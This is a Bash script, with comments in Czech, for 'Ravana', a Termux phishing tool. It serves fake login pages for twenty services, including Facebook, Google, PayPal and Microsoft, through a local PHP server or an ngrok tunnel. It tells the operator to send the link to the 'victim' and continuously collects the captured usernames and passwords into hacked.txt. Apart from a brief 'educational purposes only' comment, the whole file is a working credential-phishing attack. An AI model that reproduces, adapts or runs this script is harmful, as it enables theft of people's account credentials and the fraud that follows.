#!/data/data/com.termux/files/usr/bin/bash
#@Přepracoval Phantomm#1553 vydavatel Prince kumar
#Datum 11.7.2021
# Verze Přepracování 1.0
#Toto je vytvořeno pouze pro vzdělávací účely ...
# začni kodovat tady
# Zde definujte barevné kódování
r="\e[31;1m" # to je pro červenou
g="\e[32;1m" # zelena
y="\e[33;1m" # žluta
b="\e[34;1m" # modra
p="\e[35;1m" #fialova
n="\e[36;1m" # neznám tento název barvy
w="\e[0;1m" # To je pro bílou ...
#Konec definování barvy -------------------------------
#Trap singnals -------------------------------------
trap user_intrupt SIGINT
trap user_intrupt SIGTSTP

# vytvořit funkci pro zachycení signálů ...
#Umožňuje zkontrolovat jakoukoli aktualizaci -----
repoUpdate(){
	
	git pull https://github.com/princekrvert/Ravana.git > /dev/null 2>&1 & echo -e "${g}[⏰${g}] ${b} Koukáni na Updaty..."
	clear
}
repoUpdate #Aktualizujte repo
user_intrupt(){
	printf " \n ${w}\n"
	printf " ${r}[${w}!${r}]---->>${p} Odejít z Ravana1.0rm"
	printf " \n"
	sleep 1
	exit 1
}
#Proveďte funkci pro kontrolu uživatelských dat --------
check_cred(){
	while true;do
		if [[ -f .pweb/$1/userlog.txt ]];then
			echo -e "${g}[${w}+${g}] ${y} Nalezena uživatelská data ${w}"
			echo " "
			cat .pweb/$1/userlog.txt
			echo -e "\n"
			cp .pweb/$1/userlog.txt hacked.txt
			rm -rf .pweb/$1/userlog.txt
			echo -e "${w}[${r}+${w}] ${y} Ukládání dat do hacked.txt"
			echo " "
		fi
	done
}
#Důvěra na konci uživatele -------------------
#Vytvořte server pro zpracování požadavku ngrok
s_ngrok(){
	echo -e " "
	if [[ -e ngrok ]];then
		echo -e "${r}[${w}+${r}] ${g} Zapni tvůj Hotspot "
		chmod +x ngrok

	else
		echo -e "${r}[${w}+${r}] ${g} Stahuji ngrok "
		#wget https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip > /dev/null 2>&1
		#unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
	fi
	ran=$((RANDOM % 10))
	php -S 127.0.0.1:800$ran -t .pweb/$1 > /dev/null 2>&1 & sleep 2
	./ngrok http 127.0.0.1:800$ran > /dev/null 2>&1 & sleep 8
	n_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e "${y}[${w}+${y}]${r} Zašlete tento odkaz oběti"
	echo -e " "
	echo -e "${r}[${w}+${r}] ${p} Ngrok link:${w} $n_link"
	#Nyní volejte šekový kredit ----------
	check_cred $1


}
 #Konec funkce ngrok ------


#vytvořit server localhost -----------------------------
s_localhost(){
	#spusťte localhost
	echo -e "\n"
	echo -e "${g}[${r}~${g}] ${w} Výběr portu "
	echo -e "\n"
	ran=$((RANDOM % 10))
	echo -e "${p}[${w}01${p}] ${r} Random"
	echo -e "${p}[${w}02${p}] ${r} Vlastní  "
	echo -e "\n"
	echo -ne "${g}[${r}~${g}] ${w} Vyberte možnost: "
	read lp_optn
	if [[ $lp_optn -eq 1 ]] || [[ $lp_optn -eq 01 ]];then
		echo -e "\n"
		php -S 127.0.0.1:887$ran -t .pweb/$1 > /dev/null 2>&1 & sleep 5 
		echo -e "\n"
		echo -e "${r}[${g}+${r}] ${y} Localníhost běží na http://127.0.0.1:887$ran"
		#nyní zkontrolujte krendici uživatelů ------
		check_cred $1
	elif [[ $lp_optn -eq 2 ]] || [[ $lp_optn -eq 02 ]];then
		echo -ne "${p}[${w}-${p}] ${r} Enter a port number: "
		read p_num #čtení čísla portu
		php -S 127.0.0.1:$p_num -t .pweb/$1 > /dev/null 2>&1 & sleep 2
		echo -e "\n"
		echo -e "${r}[${g}+${r}] ${y} Localníhost běží na http://127.0.0.1:$p_num "
		check_cred $1
	else
		echo -e "\n"
		echo -e "${r}[${y}!${r}] ${p} Neplatná Možnost."
	fi
}
#Proveďte funkci pro zpracování ----------------------------
server(){
	cp -R server/$1 .pweb
	echo -e "\n"
	echo -e "${g}[${y}+${g}] ${w} Přesměrování portů "
	echo -e "\n"
	echo -e "${p}[${w}01${p}] ${r} Localníhost "
	echo -e "${p}[${w}02${p}] ${r} Ngrok "
	echo -e "\n"
	echo -ne "${y}[${w}~${y}] ${p} Vyberte možnost: "
	read p_optn
	if [[ $p_optn -eq 1 ]] || [[ $p_optn -eq 01 ]];then
		echo -e "\n"
		echo -e "${w}[${r}+${w}] ${g} Startuji localhost "
		s_localhost $1 
	elif [[ $p_optn -eq 2 ]] || [[ $p_optn -eq 02 ]];then
		echo -e "\n"
		echo -e "${w}[${r}+${w}] ${g} Staruji Ngrok "
		s_ngrok $1
	else 
		echo -e "\n"
		echo -e "${r} Neplatná možnost."
	fi

#Potřebujete spustit localhost na serveru Ngrok ..

}
#o autorovy Default Tool --------------
about_me(){
	echo " "
	echo -e "${g}[${w}+${g}] ${y} I am prince kumar amd i am a junior mechanical engineer.\n"
	echo -e "${g}[${w}+${g}] ${p} Youtube https://m.youtube.com/c/Princeweb\n"
	echo -e "${g}[${w}+${g}] ${y} Instagram https://instagram.com/sirprincekrvert\n"
	echo -e "${g}[${w}+${g}] ${r} Facebook https://m.facebook.com/Princekrvert"

}





# Udělejte funkci pro kontrolu požadavků ...---
req_m(){
	printf "${r}_______ ${p} checking for requirements ${r}_______\n"
	which php 2>&1 > /dev/null || { echo -e "${g}+++++${y}Instaluju php${g}+++++" ; apt-get install php -y; }
	which curl 2>&1 > /dev/null || { echo -e  "${g}+++++${y}Instaluju curl${g}+++++" ; apt-get install curl -y ; }
        which unzip 2>&1 > /dev/null || { echo -e "${g}+++++${y}Instaluju unzip${g}+++++" ; apt-get install unzip -y ;}
	which wget 2>&1 > /dev/null || { echo -e "${g}+++++${y}Instaluju wget${g}+++++" ; apt-get install wget -y ; }
 }
# volání funkce req
req_m
# vytvoř psací stroj pro ravana1.0r
type_W(){
	text=( 'S' 't' 'a' 'r' 't' 'i' 'n' 'g' ' ' 'R' 'a' 'v' 'a' 'n' 'a' )
	for i in "${text[@]}";do
		printf " ${r} ${i}"
		sleep .3
	done
}
#zavolat psací stroj
type_W
trap user_intrupt 
#Vytvořte banner pro Ravana1.0rm
banner(){
	clear
	
	printf "\n ${g}"
	printf "
   ██████   █████  ██    ██  █████  ███    ██  █████ 
   ██   ██ ██   ██ ██    ██ ██   ██ ████   ██ ██   ██ 
   ██████  ███████ ██    ██ ███████ ██ ██  ██ ███████ 
   ██   ██ ██   ██  ██  ██  ██   ██ ██  ██ ██ ██   ██ 
   ██   ██ ██   ██   ████   ██   ██ ██   ████ ██   ██
                      ::${y}V_2.3         
	        \e[40;1m vytvořil Prince kumar, rm Phantomm#1553\e[0;1m                                                 
"
}
#Zavolej banner  ------------
banner
#Zkontrolujte skryté složky ..
hidden(){
	if [ -d .pweb ];then
		rm -rf .pweb
		mkdir .pweb
		echo " "
	else
		mkdir .pweb
	fi
}
#hedání složky ---------------------
hidden
#možnosti zobrazení pro webové stránky ...


printf "${p}[${g}01${p}]${w} Facebook     ${p}[${g}11${p}]${w} Netflix\n"
printf "${p}[${g}02${p}]${w} Instagram    ${p}[${g}12${p}]${w} Twitter\n"
printf "${p}[${g}03${p}]${w} Snapchat     ${p}[${g}13${p}]${w} Dropbox\n"
printf "${p}[${g}04${p}]${w} Google       ${p}[${g}14${p}]${w} ig follower\n"
printf "${p}[${g}05${p}]${w} Github       ${p}[${g}15${p}]${w} Yandex\n"
printf "${p}[${g}06${p}]${w} Paypal       ${p}[${g}16${p}]${w} Origin\n"
printf "${p}[${g}07${p}]${w} Spotify      ${p}[${g}17${p}]${w} Ebay\n"
printf "${p}[${g}08${p}]${w} Microsoft    ${p}[${g}18${p}]${w} Pinterest\n"
printf "${p}[${g}09${p}]${w} Linkedin     ${p}[${g}19${p}]${w} Yahoo\n"
printf "${p}[${g}10${p}]${w} Adobe        ${p}[${g}20${p}]${w} About me\n"
echo " "
echo -ne "${y}[${p}~${y}] ${r}Vyberte možnosti:: "
read optn #Čtení pro volbu uživatele ..
#Použít prohlášení o případu
case $optn in
	01 | 1)
		echo " " 
		echo -ne "${w}[${g}+${w}] ${y} Startuji facebook server"
		server facebook ;;
	2 | 02)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji instagram server"
		server instagram ;;
	3 | 03)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji Snapchat server"
		server snapchat;;
	4 | 04)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji google server"
		server google;;

	5 | 05)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji github server"
		server github;;

	6 | 06)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji Paypal server"
		server paypal;;

	7 | 07)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji Spotify server"
		server spotify;;

	8 | 08)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji microsoft server"
		server microsoft;;

	9 | 09)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji linkedin server"
		server linkedin;;

	10)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji adobe server"
		server adobe;;

	11)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji netflix server"
		server netflix;;

	12)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji twitter server"
		server twitter;;

	13)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji dropbox server"
		server dropbox;;

	14)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji neprvé instagram sledujcí server"
		server ig_follower;;
	15)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji yandex server"
		server yandex;;
	16)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji origin server"
		server origin;;
	17)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji ebay server"
		server ebay;;
	18)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji pinterest server"
		server pinterest;;
	19)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y} Startuji yahoo server"
		server yahoo;;

20)
		echo " "
                echo -ne "${w}[${g}+${w}] ${y}  Please wait"
		about_me;;
	*)
		echo " "
                echo -ne "${w}[${r}!${w}] ${y} Neplatná možnost";;
		

esac
